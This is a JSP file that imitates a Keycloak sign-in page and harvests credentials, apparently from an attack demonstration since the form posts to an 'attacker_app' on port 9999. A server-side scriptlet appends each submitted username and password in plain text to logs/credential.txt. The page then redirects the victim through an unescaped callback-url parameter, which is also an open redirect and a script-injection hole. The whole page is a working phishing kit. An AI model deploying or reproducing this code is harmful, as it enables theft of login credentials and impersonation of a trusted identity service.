<!DOCTYPE html>
<%@page import="java.nio.charset.Charset"%>
<%@page import="java.io.IOException"%>
<%@page import="java.nio.file.StandardOpenOption"%>
<%@page import="java.nio.file.Files"%>
<%@page import="java.nio.file.Paths"%>
<%@page import="java.util.ArrayList"%>
<%@page import="java.util.List"%>
<%
    try {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        if (username != null && password != null) {
            String dir = "logs";
            String filename = "credential.txt";
            if (!Files.isDirectory(Paths.get(dir))) {
                Files.createDirectory(Paths.get(dir));
            }
            if (!Files.exists(Paths.get(dir, filename))) {
                Files.createFile(Paths.get(dir, filename));
            }
            List<String> credential = new ArrayList();
            credential.add(username + ", " + password);
        Files.write(Paths.get(dir, filename), credential, Charset.forName("UTF-8"), StandardOpenOption.APPEND);
        }
    } catch (IOException e) {
    }
%>

<html class="login-pf">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Sign in to Keycloak</title>
    <link rel="icon" href="./images/favicon.ico">
    <link href="./css/base.css" rel="stylesheet">
    <link href="./css/app.css" rel="stylesheet">
    <link href="./css/patternfly.min.css" rel="stylesheet">
    <link href="./css/patternfly-additions.min.css" rel="stylesheet">
    <link href="./css/pficon.css" rel="stylesheet">
    <link href="./css/login.css" rel="stylesheet">
    <%
    String callbackUrl = (String) request.getParameter("callback-url");
    if (callbackUrl != null) { %>
    <script type="text/javascript">
        window.location.replace("<%=callbackUrl%>");
    </script>
    <% } %>
</head>
<body class="">
<div class="login-pf-page">
    <div id="kc-header" class="login-pf-page-header">
        <div id="kc-header-wrapper" class="">
            <div class="kc-logo-text"><span>Keycloak</span></div>
        </div>
    </div>
    <div class="card-pf">
        <header class="login-pf-header">
            <h1 id="kc-page-title">Sign in to your account</h1>
        </header>
        <div id="kc-content">
            <div id="kc-content-wrapper">
                <div id="kc-form">
                    <div id="kc-form-wrapper">
                        <form id="kc-form-login" onsubmit="login.disabled = true; return true;"
                              action="http://<%=request.getServerName()%>:9999/attacker_app/index.jsp"
                              method="post">
                            <div class="form-group">
                                <label for="username" class="pf-c-form__label pf-c-form__label-text">Username or
                                    email</label>

                                <input tabindex="1" id="username" class="pf-c-form-control" name="username" value=""
                                       type="text" autofocus="" autocomplete="off" aria-invalid="true">
                            </div>
                            <span id="input-error" class="pf-c-form__helper-text pf-m-error required kc-feedback-text" aria-live="polite">
                                Invalid username or password.
                            </span>
                            <div class="form-group">
                                <label for="password" class="pf-c-form__label pf-c-form__label-text">Password</label>

                                <input tabindex="2" id="password" class="pf-c-form-control" name="password"
                                       type="password" autocomplete="off" aria-invalid="true">
                            </div>
                            <div class="form-group login-pf-settings">
                                <div id="kc-form-options">
                                </div>
                                <div class="">
                                </div>
                            </div>
                            <div id="kc-form-buttons" class="form-group">
                                <input type="hidden" id="callback-url" name="callback-url" value="http://<%=request.getServerName()%>:8080/callback?<%=request.getQueryString()%>">
                                <input type="hidden" id="id-hidden-input" name="credentialId">
                                <input tabindex="4" class="pf-c-button pf-m-primary pf-m-block btn-lg" name="login"
                                       id="kc-login" type="submit" value="Sign In">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>